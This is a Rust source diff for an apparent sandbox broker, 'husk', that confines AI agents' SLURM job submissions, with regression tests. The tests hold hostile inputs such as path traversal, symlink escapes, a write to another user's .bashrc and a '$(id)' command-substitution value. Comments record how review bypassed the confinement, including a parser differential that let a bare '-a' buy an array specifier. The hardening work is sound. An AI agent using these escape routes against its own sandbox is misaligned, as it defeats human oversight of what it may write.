+      echo \"husk: THIS JOB WAS TERMINATED EARLY - ITS OUTPUT IS INCOMPLETE\"\n\
+      echo \"husk:   job        : ${{SLURM_JOB_ID:-nojob}}\"\n\
+      echo \"husk:   ended by   : ${{_husk_signalled:-signal}} (exit $_husk_rc)\"\n\
+      echo \"husk:   likely why : preemption, the partition wall limit, or scancel -\"\n\
+      echo \"husk:                these are indistinguishable from inside the job.\"\n\
+      echo \"husk: Do NOT read the output directory as a completed run. A model that\"\n\
+      echo \"husk: does not checkpoint (e.g. ICON with lrestart = .FALSE.) leaves files\"\n\
+      echo \"husk: that look like a successful run. Check the job's state with\"\n\
+      echo \"husk:   sacct -j ${{SLURM_JOB_ID:-<jobid>}} -o JobID,State,Elapsed,ExitCode\"\n\
+      echo \"husk: before believing any result in it.\"\n\
+      echo \"husk: ==========================================================\"\n\
+    }} 2>&1 | tee -a \"$_husk_log\" >&2\n\
+  fi\n\
+  if [ \"$_husk_rc\" = 159 ]; then\n\
+    echo \"husk: job killed by SIGSYS - a syscall blocked by husk's seccomp-wrapper.\" >&2\n\
+    echo \"husk: strace will NOT tell you which one: ptrace is blocked too, so strace dies\" >&2\n\
+    echo \"husk: the same way. Reproduce the command OUTSIDE husk instead --\" >&2\n\
+    echo \"husk:   strace -f -o trace.log <your command>   # on the login node, no husk\" >&2\n\
+    echo \"husk: -- and look for one of the calls husk blocks. Send us trace.log.\" >&2\n\
+    echo \"husk: Common causes: io_uring (libuv/CMake/node - husk now returns ENOSYS for\" >&2\n\
+    echo \"husk: the probe, so this is no longer it), keyctl, bpf, perf_event_open.\" >&2\n\
+  fi\n\
+  # THE LAST LINE, on every path husk controls.\n\
+  #\n\
+  # Its ABSENCE is the diagnostic. A trapped signal gets the block above, which names sacct.\n\
+  # But SIGKILL - the OOM killer, a cgroup limit, scancel -9 - cannot be trapped, so the job\n\
+  # vanishes and husk writes nothing at all. An agent then cannot tell a husk refusal from\n\
+  # the machine taking the job away, and the LETKF session burned a second 128-rank\n\
+  # allocation on exactly that ambiguity: it read a silent death as a transient node fault\n\
+  # and retried.\n\
+  #\n\
+  # So: if this line is in the job output, husk reached the end and the exit status is the\n\
+  # workload own. If it is missing, the job was killed in a way nothing inside it could\n\
+  # observe, and sacct is the only place the reason exists.\n\
+  #\n\
+  # ONE terse line, deliberately. The first version explained all of that here, on every\n\
+  # job including every successful one, and a test caught it: husk must not comment on an\n\
+  # ordinary failure or every failing job looks like a sandbox problem. The marker has to\n\
+  # be PRESENT to make its absence mean something; it does not have to be loud. The\n\
+  # explanation belongs in the skill, which is read once, not in every job output.\n\
+  echo \"husk: job guard finished (rc=$_husk_rc)\" >&2\n\
+  exit \"$_husk_rc\"\n\
 fi\n\
-# --- original agent script ---\n"
+{net_relay}{banner}# --- hand off to the agent's script, inside the cage ---\n"
     );
 
     format!("{head}{guard}{tail}")
@@ -233,6 +2494,10 @@ fi\n\
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Where a staged agent body lives in these tests. The guard only ever names it; the
+    /// file's existence is `spool::submit`'s business, not `wrap_script`'s.
+    const BODY_PATH: &str = "/work/.husk-body-t.sh";
     use crate::protocol::Script;
     use std::collections::BTreeMap;
 
@@ -242,32 +2507,727 @@ mod tests {
             id: "t".into(),
             tool: "sbatch".into(),
             submitted_at: String::new(),
-            cwd: "/work".into(),
+            cwd: work().display().to_string(),
             argv: argv.iter().map(|s| s.to_string()).collect(),
             script: Script { source: "file".into(), name: None, body: body.into() },
             job_args: vec![],
             env: BTreeMap::new(),
         }
     }
+    /// A request whose working directory is a REAL directory, which the confinement
+    /// checks require: they resolve paths on disk and follow symlinks, because slurmd
+    /// does. `/work` in the other tests is fine only for the paths that never resolve.
+    fn req_in(dir: &std::path::Path, argv: &[&str], body: &str) -> Request {
+        let mut r = req(argv, body);
+        r.cwd = dir.to_string_lossy().to_string();
+        r
+    }
+
+    /// A workdir laid out like an ICON case: `<w>/run` for logs.
+    fn icon_workdir(tag: &str) -> std::path::PathBuf {
+        let d = std::env::temp_dir().join(format!("husk-out-{}-{tag}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(d.join("run")).unwrap();
+        d
+    }
+
+    #[test]
+    fn the_cage_does_not_narrow_when_the_agent_cds_before_submitting() {
+        // THE FIELD REPORT, 2026-07-31. `cd run && sbatch x` produced a cage one directory
+        // narrower than `sbatch run/x`, so a production ICON run died 22 times on EROFS
+        // writing to a SIBLING of the directory it was submitted from. Nothing said why:
+        // the only difference between total failure and a clean run was the shell's cwd.
+        //
+        // req.cwd is agent-supplied, so deriving the write boundary from it let the
+        // confined side choose its own confinement. The boundary is now the trusted
+        // project dir, which is the same for both invocations - so both must produce the
+        // same cage.
+        let root = icon_workdir("cdtrap");
+        let from_root = opts_in(&root, req_in(&root, &["--partition=preemptible"], "echo hi\n"), &no_uenv());
+        let mut deeper = req_in(&root, &["--partition=preemptible"], "echo hi\n");
+        deeper.cwd = root.join("run").to_string_lossy().to_string();
+        let from_subdir = opts_in(&root, deeper, &no_uenv());
+
+        let writable = |o: &[String]| {
+            o.iter().any(|x| x == &format!("--chdir={}", root.display()))
+                || o.iter().any(|x| x.starts_with("--chdir="))
+        };
+        assert!(writable(&from_root) && writable(&from_subdir));
+
+        // The CAGE is what must not differ. Both submissions bind the same writable root,
+        // because it comes from the trusted dir rather than from the request.
+        let cage_of = |r: Request| match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), &root) {
+            Decision::Submit(sub) => sub.wrapped_script,
+            other => panic!("expected Submit: {}", matches!(other, Decision::Reject(_))),
+        };
+        let a = cage_of(req_in(&root, &["--partition=preemptible"], "echo hi\n"));
+        let mut d = req_in(&root, &["--partition=preemptible"], "echo hi\n");
+        d.cwd = root.join("run").to_string_lossy().to_string();
+        let b = cage_of(d);
+        let bind = format!("--bind' '{}", root.display());
+        assert!(
+            a.contains(&root.to_string_lossy().to_string())
+                && b.contains(&root.to_string_lossy().to_string()),
+            "both cages must bind the project dir writable, whatever cwd was used\n{bind}"
+        );
+        // ...and the job is TOLD what it may write, because a denial that is not
+        // attributed reads as a filesystem fault and invites confident wrong fixes.
+        assert!(a.contains("husk: compute cage active"), "the banner must be emitted");
+        assert!(a.contains("export HUSK_WRITABLE="), "the job must be able to read it too");
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_run_script_may_put_its_logs_where_it_wants_inside_the_workdir() {
+        // The ICON shape, and the whole point of the change: HPC workflows find files by
+        // name, so a forced slurm-%j.out in the wrong directory is not cosmetic to them.
+        // Note `/./` in the middle — real run scripts generate paths like this.
+        let w = icon_workdir("icon");
+        let body = format!(
+            "#!/bin/bash\n#SBATCH --partition=preemptible\n\
+             #SBATCH --job-name=exp.mch_icon-ch1_small.run\n\
+             #SBATCH --chdir={w}/./run\n\
+             #SBATCH --output={w}/./run/LOG.exp.mch_icon-ch1_small.run.%j.o\n\
+             #SBATCH --error={w}/./run/LOG.exp.mch_icon-ch1_small.run.%j.o\necho hi\n",
+            w = w.display()
+        );
+        let o = opts_in(&w, req_in(&w, &[], &body), &no_uenv());
+        let run = std::fs::canonicalize(w.join("run")).unwrap();
+        assert!(has(&o, &format!("--chdir={}", run.display())), "{o:?}");
+        assert!(
+            has(&o, &format!("--output={}/LOG.exp.mch_icon-ch1_small.run.%j.o", run.display())),
+            "the script's own log path must survive: {o:?}"
+        );
+        assert!(
+            has(&o, &format!("--error={}/LOG.exp.mch_icon-ch1_small.run.%j.o", run.display())),
+            "{o:?}"
+        );
+        let _ = std::fs::remove_dir_all(&w);
+    }
+
+    #[test]
+    fn output_paths_that_escape_the_workdir_are_refused() {
+        // Each of these is an uncaged write outside the job's blast radius, because
+        // slurmd performs the write as the user and outside the sandbox.
+        let w = icon_workdir("escape");
+        // A symlink INSIDE the workdir pointing out of it: a string prefix check would
+        // pass this, which is why confinement canonicalises instead.
+        #[cfg(unix)]
+        let _ = std::os::unix::fs::symlink("/tmp", w.join("out"));
+        for bad in [
+            format!("{}/../escaped.log", w.display()), // traversal
+            format!("{}/out/escaped.log", w.display()), // via symlink
+            "/users/victim/.bashrc".to_string(),        // absolute, elsewhere
+        ] {
+            let d = decide(
+                &req_in(&w, &["--partition=preemptible", &format!("--output={bad}")], "echo hi\n"),
+                &no_uenv(),
+                &FsPolicy::unchecked_for_test(),
+                &w,
+            );
+            assert!(
+                matches!(d, Decision::Reject(_)),
+                "must refuse an output path escaping the workdir: {bad}"
+            );
+        }
+        let _ = std::fs::remove_dir_all(&w);
+    }
+
+    #[test]
+    fn the_job_name_specifier_is_not_allowed_in_an_output_path() {
+        // THE PARSER DIFFERENTIAL. slurmd expands %x AFTER husk has validated the string,
+        // and the job name is agent-supplied — `v_name` permits dots, so a job named `..`
+        // turns <workdir>/%x into the workdir's PARENT. Validating a string that someone
+        // else expands is the F13/F14 shape; the specifier is excluded rather than
+        // reasoned about.
+        let w = icon_workdir("spec");
+        for bad in ["%x/log.o", "run/%x.o", "%q.o"] {
+            let d = decide(
+                &req_in(
+                    &w,
+                    &["--partition=preemptible", &format!("--output={}/{bad}", w.display())],
+                    "echo hi\n",
+                ),
+                &no_uenv(),
+                &FsPolicy::unchecked_for_test(),
+                &w,
+            );
+            assert!(matches!(d, Decision::Reject(_)), "must refuse {bad}");
+        }
+        let _ = std::fs::remove_dir_all(&w);
+    }
+
+    #[test]
+    fn array_specifiers_are_refused_when_the_job_is_not_an_array() {
+        // `RA-2`, the submit-time half. MEASURED on Santis, a NON-array batch job:
+        //     sbatch --output=probe-A%A-a%a-s%s.log --wrap=true
+        //         -> probe-A837636-a4294967294-sbatch.log
+        // slurmd substitutes the JOB id for %A and 4294967294 for %a, while husk's guard
+        // expands them from SLURM_ARRAY_JOB_ID/SLURM_ARRAY_TASK_ID, which are unset there.
+        // The guard's leaf was `probe-A-a-sbatch.log`, so the symlink check AND `N1`'s
+        // hard-link check both ran on a file that does not exist — A1-F1 re-armed through
+        // a specifier husk documents as allowed, with the job id handed back by `sbatch` so
+        // nothing even has to be guessed.
+        //
+        // husk refuses rather than models. Expanding %a to `4294967294` would bake a SLURM
+        // internal constant, measured once on one of two clusters, into generated shell
+        // that no test in this repo can notice going stale — while husk refuses `%J` on
+        // exactly the ground that a guard-side expansion must not guess another program's
+        // rendering.
+        let w = icon_workdir("arrayspec");
+        let go = |extra: &[&str]| {
+            let mut argv = vec!["--partition=preemptible"];
+            argv.extend_from_slice(extra);
+            decide(&req_in(&w, &argv, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), &w)
+        };
+
+        for (opt, pattern) in [
+            ("--output", "probe-A%A-a%a-s%s.log"),
+            ("--output", "x%A.log"),
+            ("--error", "x%a.err"),
+        ] {
+            let arg = format!("{opt}={pattern}");
+            match go(&[&arg]) {
+                Decision::Reject(why) => {
+                    assert!(why.starts_with(opt), "the refusal must name the option: {why}");
+                    assert!(
+                        why.contains("--array") && why.contains("SLURM_ARRAY"),
+                        "it must name the option that would make the specifier defined and \
+                         the variable husk reads, not merely say no (`P11`): {why}"
+                    );
+                }
+                _ => panic!("{pattern} without --array must be refused"),
+            }
+        }
+
+        // WITH `--array` the same patterns submit. husk fully supports array jobs — one is
+        // documented in this file's own option registry — and on an array task the
+        // variables ARE set, which is the case the guard was measured correct for.
+        //
+        // `P15`: and the option this check READ must be the option SLURM RECEIVES. Reading
+        // `--array` off the request and then not emitting it would leave the accepted `%A`
+        // running on a non-array job — the exact divergence, reached through the fix for it.
+        //
+        // `RA2-1`: that sentence was written here and then asserted on ONE of the four
+        // positive arms, and the bypass lived in the gap. It is asserted on EVERY arm now —
+        // whatever spelling the request used, husk must SUBMIT the canonical `--array=0-3`,
+        // and the arm that needs no option must submit without husk inventing one.
+        let submits_as_an_array = |d: Decision, how: &str| match d {
+            Decision::Submit(sub) => assert!(
+                has(&sub.options, "--array=0-3"),
+                "husk accepted the array specifier via {how}, so --array must be in what husk \
+                 SUBMITS, canonically spelled: {:?}",
+                sub.options
+            ),
+            Decision::Reject(why) => panic!("{how}: an array job must still submit: {why}"),
+            _ => panic!("{how}: expected a submission"),
+        };
+        for (opt, pattern) in [("--output", "probe-A%A-a%a-s%s.log"), ("--error", "x%a.err")] {
+            let arg = format!("{opt}={pattern}");
+            submits_as_an_array(go(&["--array=0-3", &arg]), &format!("--array=0-3 {arg}"));
+        }
+        // …and an --array husk would NOT forward cannot buy the specifier: an out-of-grammar
+        // value is a refusal of the whole submission, never a silently dropped option.
+        assert!(
+            matches!(go(&["--array=$(id)", "--output=x%A.log"]), Decision::Reject(_)),
+            "an --array value husk will not forward must refuse the job, not license %A"
+        );
+        // …and the short spelling counts, or the refusal is one `-a` away from useless.
+        submits_as_an_array(go(&["-a", "0-3", "--output=x%A.log"]), "-a 0-3");
+        // …and the glued short spelling, which getopt accepts and a naive scanner does not.
+        submits_as_an_array(go(&["-a0-3", "--output=x%A.log"]), "-a0-3");
+        // …and so does a `#SBATCH` directive, because that is the OTHER way the request
+        // says --array and husk must read the same request SLURM will.
+        submits_as_an_array(
+            decide(
+                &req_in(
+                    &w,
+                    &["--partition=preemptible", "--output=x%A.log"],
+                    "#SBATCH --array=0-3\necho hi\n"
+                ),
+                &no_uenv(),
+                &FsPolicy::unchecked_for_test(),
+                &w
+            ),
+            "#SBATCH --array=0-3",
+        );
+        // A specifier that needs nothing is unaffected, so this is a refusal of %A/%a and
+        // not of specifiers — and husk must not have invented an --array to satisfy itself.
+        match go(&["--output=x%j.log"]) {
+            Decision::Submit(sub) => assert!(
+                !has_prefix(&sub.options, "--array"),
+                "%j requires nothing, so husk must submit it with no --array: {:?}",
+                sub.options
+            ),
+            other => panic!(
+                "%j is defined for every job and must still submit: {}",
+                match other {
+                    Decision::Reject(why) => why,
+                    _ => "not a submission".into(),
+                }
+            ),
+        }
+
+        // ---- `RA2-1`, the bypass, verbatim ----
+        //
+        //     sbatch --job-name -a --output=probe-A%A.log job.sh
+        //
+        // FOUR TOKENS, and it SUBMITTED. The gate asked `pick`, i.e.
+        // `sbatch::option_value`, which walks the token vector and returns `tokens[i+1]`
+        // after any `-a` — with no idea that this `-a` is `--job-name`'s VALUE.
+        // `interpret_cli`, which builds what husk hands sbatch, read the same tokens as
+        // `--job-name=-a` and emitted NO `--array`. Two readers of one token list, and
+        // `%A` rode out on a job SLURM never ran as an array: `P15`, reached through the
+        // check that exists to prevent exactly that divergence.
+        //
+        // This is a property of `option_value`, not of the specifier table, so the arms
+        // below use three different value-taking options — the fix must not be "special-case
+        // --job-name".
+        for (how, argv) in [
+            ("--job-name -a", vec!["--job-name", "-a", "--output=probe-A%A.log"]),
+            ("-J -a", vec!["-J", "-a", "--output=probe-A%A.log"]),
+            ("--comment -a", vec!["--comment", "-a", "--error=probe-a%a.err"]),
+        ] {
+            match go(&argv) {
+                Decision::Reject(why) => assert!(
+                    why.contains("--array") && why.contains("SLURM_ARRAY"),
+                    "{how}: the refusal must still teach the remedy (`P11`): {why}"
+                ),
+                Decision::Submit(sub) => panic!(
+                    "{how}: a bare -a in another option's VALUE position bought %A, and husk \
+                     submitted it with no --array: {:?}",
+                    sub.options
+                ),
+                _ => panic!("{how}: expected a decision"),
+            }
+        }
+        // …and through the OTHER channel, because `pick` scanned the `#SBATCH` directives
+        // with the same naive walk and `interpret_cli` parses them with the same real one.
+        match decide(
+            &req_in(
+                &w,
+                &["--partition=preemptible", "--output=probe-A%A.log"],
+                "#SBATCH --job-name -a\necho hi\n",
+            ),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            &w,
+        ) {
+            Decision::Reject(_) => {}
+            Decision::Submit(sub) => panic!(
+                "a bare -a in a #SBATCH value position bought %A: {:?}",
+                sub.options
+            ),
+            _ => panic!("expected a decision"),
+        }
+        // …and the same shape with a REAL --array beside it still submits, so what is
+        // refused above is the bypass and not the option. `-a` survives as the job name,
+        // because husk re-emits it rather than reading it twice.
+        match go(&["--job-name", "-a", "--array=0-3", "--output=probe-A%A.log"]) {
+            Decision::Submit(sub) => {
+                assert!(has(&sub.options, "--array=0-3"), "{:?}", sub.options);
+                assert!(has(&sub.options, "--job-name=-a"), "{:?}", sub.options);
+            }
+            Decision::Reject(why) => panic!("a genuine array job must still submit: {why}"),
+            _ => panic!("expected a submission"),
+        }
+        let _ = std::fs::remove_dir_all(&w);
+    }
+
+    #[test]
+    fn every_output_path_husk_emits_is_one_husk_would_accept() {
+        // `RA-5`. The round-3 fix routed husk's OWN default `slurm-%j.out` through
+        // `confine_output_pattern` — "a string is not trusted because husk typed it" — and
+        // reverting that routing turned nothing red.
+        //
+        // WHAT THIS PINS, exactly, because the honest scope matters more than a green tick
+        // (`P10`, `P12`): every `--output`/`--error` husk emits must round-trip through the
+        // very function that validates a supplied one. That catches any bypass producing a
+        // value the function would REJECT — a relative name, a path built on the
+        // adversary-controlled `req.cwd` rather than on the confined `--chdir`, a leaf
+        // outside the writable set.
+        //
+        // WHAT IT DOES NOT PIN: a bypass that re-derives the identical string
+        // (`format!("{chdir}/slurm-%j.out")`) is invisible here, and no behavioural test in
+        // this repo can see it, because for husk's own default the two agree by
+        // construction — the only property that differs is the `%`-in-a-directory refusal,
+        // and the `--chdir` check above refuses that first. The routing's value is that
+        // there is ONE construction site, not two that can drift; that is a structural
+        // claim and it is stated here rather than pretended away.
+        let base = icon_workdir("emitted-roundtrip");
+        std::fs::create_dir_all(base.join("logs")).unwrap();
+        let cases: Vec<Vec<String>> = vec![
+            vec!["--partition=preemptible".into()],
+            vec!["--partition=preemptible".into(), format!("--chdir={}/logs", base.display())],
+            vec!["--partition=preemptible".into(), "--output=named.log".into()],
+            vec!["--partition=preemptible".into(), "--output=logs/named.log".into()],
+        ];
+        for argv in &cases {
+            let borrowed: Vec<&str> = argv.iter().map(|s| s.as_str()).collect();
+            let sub = match decide(
+                &req_in(&base, &borrowed, "echo hi\n"),
+                &no_uenv(),
+                &FsPolicy::unchecked_for_test(),
+                &base,
+            ) {
+                Decision::Submit(sub) => sub,
+                other => panic!("{argv:?} must submit: {}", matches!(other, Decision::Reject(_))),
+            };
+            let val = |flag: &str| {
+                sub.options
+                    .iter()
+                    .find_map(|o| o.strip_prefix(flag))
+                    .unwrap_or_else(|| panic!("no {flag} in {:?}", sub.options))
+                    .to_string()
+            };
+            let chdir = val("--chdir=");
+            for flag in ["--output=", "--error="] {
+                let emitted = val(flag);
+                assert!(
+                    emitted.starts_with('/'),
+                    "{argv:?}: {flag}{emitted} is not absolute, so where SLURM writes it \
+                     depends on a working directory husk did not decide"
+                );
+                assert_eq!(
+                    settings::confine_output_pattern(&emitted, &chdir).as_deref(),
+                    Ok(emitted.as_str()),
+                    "{argv:?}: husk emitted a {flag} value that husk itself would refuse or \
+                     rewrite. The default is not trusted because husk typed it — every \
+                     component to its left came from the request."
+                );
+            }
+        }
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn a_specifier_in_a_directory_component_is_refused_on_the_default_path_too() {
+        // D2-7. `confine_output_pattern` has refused a `%` in a DIRECTORY component since
+        // A1 — but only for a path the AGENT supplied. With no `--output`, husk built
+        // `{chdir}/slurm-%j.out` with `format!` and shipped it unchecked, so
+        // `--chdir=<root>/%x` with `--job-name=..` had slurmd open
+        // `<root>/../slurm-<id>.out`: one level above the writable root per `%x` component,
+        // unbounded by nesting, created and appended to as the user OUTSIDE the cage, with
+        // the job's own stdout in it. `P9`, and the SECOND time this function has produced
+        // that shape — A1 itself was "the test exercised the whole-path case, the code split
+        // the path". Here the check covered one of the two ways the value is produced.
+        //
+        // The finding is stated as an equality, so the test asserts it as one: husk emitted,
+        // on the default path, exactly the value it refuses on the explicit path.
+        //
+        // `%x` in particular needs `--job-name`, which `v_name` accepts as `..` — but the
+        // refusal must NOT depend on the job name, or on which specifier it is, or on the
+        // still-unconfirmed question of whether slurmd expands `%` in directory components
+        // (`D2 §8`). Fail closed on the `%`.
+        let base = icon_workdir("dirspec-default");
+        let w = base.join("%x");
+        std::fs::create_dir_all(&w).unwrap();
+        let argv = ["--partition=preemptible", "--job-name=.."];
+
+        // (1) SUPPLIED, from a clean working directory: refused since A1, "puts a SLURM %
+        //     specifier in a DIRECTORY component".
+        let clean = base.join("run");
+        let mut explicit = argv.to_vec();
+        let o = format!("--output={}/slurm-%j.out", w.display());
+        explicit.push(&o);
+        match decide(&req_in(&clean, &explicit, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), &base) {
+            Decision::Reject(why) => assert!(why.contains("DIRECTORY"), "{why}"),
+            _ => panic!("a % in a directory component must be refused when supplied"),
+        }
+
+        // (2) …and the DEFAULT, which is the same string with nobody supplying it, must be
+        //     refused too. This is the arm that was missing.
+        //
+        //     `RA-6`/`P11`: it must be refused NAMING THE SOURCE THE AGENT ACTUALLY USED.
+        //     This request passes no `--chdir` at all, and the first version of this check
+        //     answered `--chdir: …` anyway — sending the agent to edit an option it never
+        //     wrote. Blaming husk's own `slurm-%j.out` would be the other wrong answer, and
+        //     is why the refusal happens here rather than in `confine_output_pattern`.
+        match decide(&req_in(&w, &argv, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), &base) {
+            Decision::Reject(why) => {
+                assert!(
+                    why.contains("the directory this job was submitted from") && why.contains('%'),
+                    "no --chdir was passed, so the refusal must name the directory the job \
+                     was submitted from: {why}"
+                );
+                assert!(
+                    !why.contains("--chdir"),
+                    "and it must NOT name an option the agent did not pass (RA-6): {why}"
+                );
+            }
+            Decision::Submit(sub) => panic!(
+                "husk emitted an --output under a `%` directory it refuses when asked \
+                 directly: {:?}",
+                sub.options
+            ),
+            _ => panic!("expected a refusal"),
+        }
+
+        // (2b) The SAME `%` directory, reached through an explicit `--chdir`, is refused
+        //      naming `--chdir` — because that IS what the agent can change here. One
+        //      condition, two sources, two attributions; `decide` has had this distinction
+        //      twelve lines above since A1 and the new check had collapsed it.
+        let chdir_arg = format!("--chdir={}", w.display());
+        let mut with_chdir = argv.to_vec();
+        with_chdir.push(&chdir_arg);
+        match decide(&req_in(&clean, &with_chdir, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), &base) {
+            Decision::Reject(why) => assert!(
+                why.starts_with("--chdir:"),
+                "an explicitly passed --chdir must be blamed on --chdir: {why}"
+            ),
+            _ => panic!("a `%` --chdir must be refused"),
+        }
+
+        // (2c) …and when the `%` only appears AFTER resolution — a symlinked cwd pointing
+        //      into a `%` directory — the refusal must name BOTH: the path the agent typed
+        //      and the one husk resolved. Quoting only the resolved path made the message a
+        //      statement about a string the agent has never seen (`RA-6`), and quoting only
+        //      the typed one would make it false, since that path holds no `%`.
+        let link = base.join("cwdlink");
+        let _ = std::fs::remove_file(&link);
+        std::os::unix::fs::symlink(&w, &link).unwrap();
+        match decide(&req_in(&link, &argv, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), &base) {
+            Decision::Reject(why) => {
+                assert!(
+                    why.contains(&w.to_string_lossy().to_string()),
+                    "the resolved `%` path is where the problem is, so name it: {why}"
+                );
+                assert!(
+                    why.contains(&link.to_string_lossy().to_string()),
+                    "and name what the agent actually typed, or the refusal is about a \
+                     string it has never seen (RA-6): {why}"
+                );
+            }
+            _ => panic!("a cwd resolving into a `%` directory must be refused"),
+        }
+
+        // (3) The same request from a `%`-free working directory still submits, so this is
+        //     a refusal of the `%` and not of the shape of the test.
+        let ok = clean;
+        match decide(&req_in(&ok, &argv, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), &base) {
+            Decision::Submit(sub) => assert!(
+                has(&sub.options, &format!("--output={}/slurm-%j.out", ok.display())),
+                "{:?}",
+                sub.options
+            ),
+            Decision::Reject(why) => panic!("a %-free working directory must still submit: {why}"),
+            _ => panic!("expected a submission"),
+        }
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn a_specifier_in_a_directory_component_is_refused_rather_than_guessed() {
+        // husk cannot resolve a directory it cannot expand, and validating the
+        // unexpanded string would be validating something other than what slurmd opens.
+        let w = icon_workdir("dirspec");
+        let d = decide(
+            &req_in(
+                &w,
+                &["--partition=preemptible", &format!("--output={}/%j/log.o", w.display())],
+                "echo hi\n",
+            ),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            &w,
+        );
+        match d {
+            Decision::Reject(why) => assert!(why.contains("DIRECTORY"), "{why}"),
+            _ => panic!("a % specifier in a directory component must be refused"),
+        }
+        let _ = std::fs::remove_dir_all(&w);
+    }
+
+    #[test]
+    fn a_chdir_outside_the_workdir_is_refused() {
+        let w = icon_workdir("chdir");
+        let d = decide(
+                &req_in(&w, &["--partition=preemptible", "--chdir=/tmp"], "echo hi\n"),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            &w,
+        );
+        assert!(matches!(d, Decision::Reject(_)), "--chdir must stay inside the workdir");
+        let _ = std::fs::remove_dir_all(&w);
+    }
+
+    /// A REAL directory standing in for the project dir. `--chdir` is now confined to the
+    /// writable set, which canonicalises — so tests can no longer use a synthetic "/work".
+    fn work() -> &'static std::path::Path {
+        static W: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
+        W.get_or_init(|| {
+            let d = std::env::temp_dir().join(format!("husk-test-work-{}", std::process::id()));
+            std::fs::create_dir_all(&d).unwrap();
+            d
+        })
+    }
+
     fn no_uenv() -> Session {
-        Session { uenv: None, view: None, required_partition: "preemptible".into() }
+        Session { uenv: None, view: None, allowed_partitions: vec!["preemptible".into()], allowed_accounts: vec![], allowed_uenvs: vec![], limits: Default::default() }
+    }
+
+    /// A session that knows the partition's limits, as a real broker does after asking
+    /// scontrol at startup.
+    fn with_limits() -> Session {
+        Session {
+            limits: [(
+                "preemptible".to_string(),
+                crate::session::PartitionLimits {
+                    default_time: Some("00:30:00".into()),
+                    max_time: Some("01:00:00".into()),
+                },
+            )]
+            .into_iter()
+            .collect(),
+            ..no_uenv()
+        }
+    }
+
+    // A caged agent that hit the partition guard on 2026-08-01 reported the message read
+    // as possibly SPOOFED: it said "only --partition=short is permitted here" while sinfo
+    // showed `normal` up with 28 idle nodes. It spent extra calls corroborating before it
+    // would act. Availability is not authorization, and the message must not appear to
+    // claim otherwise.
+    #[test]
+    fn the_partition_refusal_separates_authorization_from_availability() {
+        let d = decide(
+            &req_in(work(), &["--partition=normal"], "echo hi\n"),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        );
+        let Decision::Reject(why) = d else { panic!("the wrong partition must be refused") };
+        assert!(why.contains("husk"), "the message must name the restricting party: {why}");
+        assert!(
+            why.contains("may exist and be idle") || why.contains("not the cluster's availability"),
+            "the message must concede that other partitions exist: {why}"
+        );
+        assert!(
+            !why.contains("is permitted here"),
+            "the old wording read as a claim about the cluster, not about husk: {why}"
+        );
+        // What that agent said WORKED, and must survive rewording: constraint, remedy and
+        // rationale together.
+        assert!(why.contains("--partition=preemptible"), "the remedy must be named: {why}");
+        assert!(why.contains("preemptible/low-priority"), "the rationale must survive: {why}");
+    }
+
+    // The same agent concluded "standing policy, not transient failure" BECAUSE the message
+    // was identical on retry — that is what stopped it retrying blind. An unstable message
+    // (a timestamp, a job count, a set iteration order) would quietly cost that.
+    #[test]
+    fn the_partition_refusal_is_byte_identical_on_retry() {
+        let msg = || match decide(
+            &req_in(work(), &["--partition=normal"], "echo hi\n"),
+            &with_limits(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        ) {
+            Decision::Reject(why) => why,
+            _ => panic!("must reject"),
+        };
+        let (a, b, c) = (msg(), msg(), msg());
+        assert_eq!(a, b, "the refusal changed between identical requests");
+        assert_eq!(b, c, "the refusal changed between identical requests");
+    }
+
+    // The gap the agent named: the rule was taught, its CONSEQUENCE was not. Its job
+    // inherited a 30-minute limit it only found from squeue afterwards — harmless at 7
+    // minutes, fatal for a longer run. husk moves jobs onto a partition the submitter did
+    // not choose, so it is the right place to say what that costs.
+    #[test]
+    fn a_submission_with_no_time_is_told_the_limit_it_inherits() {
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible"], "echo hi\n"),
+            &with_limits(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        );
+        let Decision::Submit(sub) = d else { panic!("a valid submission must be accepted") };
+        assert!(sub.note.contains("00:30:00"), "the inherited default must be named: {}", sub.note);
+        assert!(sub.note.contains("--time"), "the remedy must be named: {}", sub.note);
+        // sinfo's TIMELIMIT column is MaxTime, which is NOT what an untimed job gets —
+        // that is precisely how the agent read the wrong number.
+        assert!(sub.note.contains("sinfo"), "say why sinfo disagrees: {}", sub.note);
+    }
+
+    #[test]
+    fn a_submission_that_sets_its_own_time_is_not_lectured() {
+        for argv in [
+            vec!["--partition=preemptible", "--time=02:00:00"],
+            vec!["--partition=preemptible", "-t", "02:00:00"],
+        ] {
+            let d = decide(
+                &req_in(work(), &argv, "echo hi\n"),
+                &with_limits(),
+                &FsPolicy::unchecked_for_test(),
+                work(),
+            );
+            let Decision::Submit(sub) = d else { panic!("must be accepted: {argv:?}") };
+            assert!(sub.note.is_empty(), "the author chose a limit; say nothing: {}", sub.note);
+        }
+        // A #SBATCH directive is the author choosing, too.
+        let d = decide(
+            &req_in(
+                work(),
+                &["--partition=preemptible"],
+                "#SBATCH --time=02:00:00\necho hi\n",
+            ),
+            &with_limits(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        );
+        let Decision::Submit(sub) = d else { panic!("must be accepted") };
+        assert!(sub.note.is_empty(), "a #SBATCH --time is a choice too: {}", sub.note);
+    }
+
+    // Without scontrol (no SLURM, an unknown partition, a denied query) husk must say
+    // nothing rather than invent a number. A confidently wrong limit is worse than none.
+    #[test]
